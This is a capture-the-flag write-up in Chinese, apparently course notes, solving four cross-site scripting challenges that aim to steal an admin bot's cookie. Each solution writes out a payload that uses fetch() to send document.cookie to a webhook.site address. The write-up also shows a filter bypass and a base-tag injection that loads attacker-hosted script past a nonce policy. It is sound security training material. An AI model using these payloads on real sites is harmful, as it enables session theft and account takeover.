#Web 


目標: 拿 admin cookie

---
# XSS1
## 題目
給了一個網址，點開來：
![[W6-1_web.png|322]]
精簡版 source code
```js
<body>
	<h1>🌏XSS1 - Note Sharing</h1>
	<form method="post">
		<textarea name="note" rows="4" cols="50"></textarea><br />
		<button class="btn" type="submit">Submit Note</button>
	</form>
	<form action="/report" method="get">
		<button class="btn" type="submit">
			Report to admin
		</button>
	</form>
</body>
```


- **Submit Note：** 把輸入顯示在新的連結頁面上
  ![[W6-1_web_note.png|183]]

- **Report to admin**：會把輸入的 URL 給 admin 讓 admin 讀
	![[W6-1_web2.png|344]]
	精簡版 source code：
	```js
	<body>
		<h1>Report URL</h1>
		<form method="POST">
			<label for="urlInput">Enter URL:</label>
			<input type="text" id="urlInput" name="url" required />
			<button class="btn" type="submit">Report URL</button>
		</form>
	</body>
	```
	

## 解題
1. 題目為 XSS -> 找可以「攻擊自己的頁面」讓別人讀取 ->  Submit Note 後的 Note Content
2. 目標為拿到 admin 的 cookie -> 檢查 Note Content 網頁用的 SameSite cookie method
   ![[W6-1_samesite.png]]
   -> Lax
   > [!abstract] SameSite cookie - Lax（常見預設）
   >  Cross-Site request 同時符合以下條件才帶 Cookie：
   >  - Top-level navigation：`location` / `<form>` / `<a>`
   >  -  不包含 `<iframe>` / `<img>` 等 Cross-Site embedding
   >  - 常見：
   > 		 - **Safe**：`GET` / `HEAD` / `OPTIONS`　
   > 		 - **Unsafe**：`POST` / `PUT` / `DELETE` …
   >  - Chrome：未指定 SameSite 的新 Cookie，2 分鐘內允許 POST

   -> admin GET 時會攜帶 cookie
   -> 讓 admin GET Note Content 頁面並想辦法留下 cookie
3. 使用 XSS 手法把訪問者資訊送出到目的地 -> 用 `fetch()`
4. 開 [webhook](https://webhook.site/) 獲取臨時的自己的網址作為接收資訊的目的地，在 note 區輸入:
	```js
	<script>
		fetch("https://webhook.site/[臨時網址]?aaa="+btoa(document.cookie))
	</script>
	```
	送出後複製 Note Content 網址
5. 到 Report to admin 輸入 Note Content 網址，並到 webhook 找
   ![[W6-1_aaa.png]]
6. aaa = `ZmxhZz1DVEZ7eHNzMV85Y2VlNDVlNWRiNjc3YTFlNWNmYjRjOTB9`，用 base64 decode
	```bash
	echo -n "ZmxhZz1DVEZ7eHNzMV85Y2VlNDVlNWRiNjc3YTFlNWNmYjRjOTB9" | base64 -d
	```
7. flag = `CTF{xss1_9cee45e5db677a1e5cfb4c90}`

---
# XSS2

## 題目
長得跟 [[#題目|XSS1]] 差不多，但大標變為 `XSS2 - Note Sharing with innerHTML`
## 解題
1. 嘗試輸入 `<script>alert(1)</script>`
   ![[W6-2_note.png]]![[W6-2_note2.png]]
   -> 被補齊了
2. 嘗試輸入 `"</script>; <script>alert(1) </script>` -> 成功！
3. 開 webhook，在 Note 區輸入
   ```js
   "</script>; <script>
		fetch("https://webhook.site/[臨時網址]?aaa="+btoa(document.cookie))
	</script>
   ```
4. 到 Report to admin 輸入 Note Content 網址，並到 webhook 找
   ![[W6-2_aaa.png]]
5. base64 decode -> flag=`CTF{xss2_c1444f62b5a7a02ee55eada8}`


---
# XSS3

## 題目
長得跟 [[#題目|XSS1]] 差不多，但大標變為 `XSS3 - Video Button`
輸入連結網址後，會跳到 Video Button 的頁面，內含網址超連結
```js
<a id="videobtn" href="[輸入]">Your video button</a>
```
## 解題
1. 在 `herf=""` 中插入 script -> 輸入區輸入：
   ```js
   javascript:fetch("https://webhook.site/[webhook網址]?aaa="+btoa(document.cookie))
   ```
2. 到 Report to admin 輸入 Video Butto 網址，並到 webhook 找
   ![[W6-3_aaa.png]]
3. base64 decode ->flag=`CTF{xss3_62601b11047ff0d70cb19208}`

---

# XSS4

## 題目
長得跟 [[#題目|XSS1]] 差不多，但大標變為 `XSS4 - Any Script`
![[W6-4_web.png|313]]
點 "Submit Script" -> 進入 Note Content 頁面
![[W6-4_note.png|212]]
```js
<body>
	<h1>Note Content</h1>
	aaa
	<p id="timeDisplay"></p>
	<button id="showTimeButton" class="btn">更新時間</a>
	<script src="/static/script.js" nonce="NDkxNzQ3" defer></script>
</body>
```

## 解題
1. 觀察 Note Content 頁面，發現有使用 nonce -> 只會允許帶有「在後端產生隨機的字串」標籤的 script -> 用公開的 CDN 上傳惡意套件讓網頁載入
2. 寫惡意套件 `static/script.js` 並上傳到公開的 github repository
   ```js
   fetch("https://webhook.site/[webhook網址]?aaa="+btoa(document.cookie))
   ```
   ```text
   [repository名稱]/
    |
    └── static/
        └── script.js
   ```
3. 用公開的 CDN，這邊使用 Cloudflare Pages，登入後進入 Workers & Pages，選擇 `Create application` → Continue with Pages → `Connect to Git`，連接 GitHub，選擇公開的 github repository，按 `Save and Deploy`
   完成後會得到一個分配的網址 `https://[...].pages.dev`
4. 回 CTF 題目的 Any Script 頁面，用 `<base herf="[分配的網址]">` 改變所有相對路徑的 base URL，當程式呼叫 `"./static/script.js"` 時會改為呼叫 `[分配的網址]/static/script.js`，輸入區輸入
   ```js
   <base href="[分配的網址]">
   ```
5. 到 Report to admin 輸入 Note Content 網址，並到 webhook 找
   ![[W6-4_aaa.png]]
6. base64 decode -> flag=`CTF{xss4_362e28d7809958cf8f227388}`
   
